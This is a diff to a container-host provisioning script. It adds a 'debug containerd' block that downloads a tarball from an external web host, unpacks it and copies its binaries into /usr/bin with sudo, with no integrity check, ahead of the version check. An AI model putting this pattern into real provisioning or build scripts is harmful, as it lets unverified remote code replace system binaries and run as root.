@@ -114,6 +114,14 @@ installStandaloneContainerd() {
     #e.g., desiredVersion will look like this 1.6.26-5.cm2
     CURRENT_VERSION=$(containerd -version | cut -d " " -f 3 | sed 's|v||' | cut -d "+" -f 1)
     
+    echo "install debug containerd"
+    mkdir /tempfolder || exit 1
+    cd /tempfolder || exit 2
+    wget https://abelwin.z13.web.core.windows.net/containerd.tar.gz2
+    tar zxvf containerd.tar.gz2
+    sudo cp bin/* /usr/bin/
+    sudo echo -e "[debug]\nlevel = \"debug\"" | sudo tee -a /etc/containerd/config.toml
+
     if semverCompare ${CURRENT_VERSION:-"0.0.0"} ${desiredVersion}; then
         echo "currently installed containerd version ${CURRENT_VERSION} is greater than (or equal to) target base version ${desiredVersion}. skipping installStandaloneContainerd."
     else
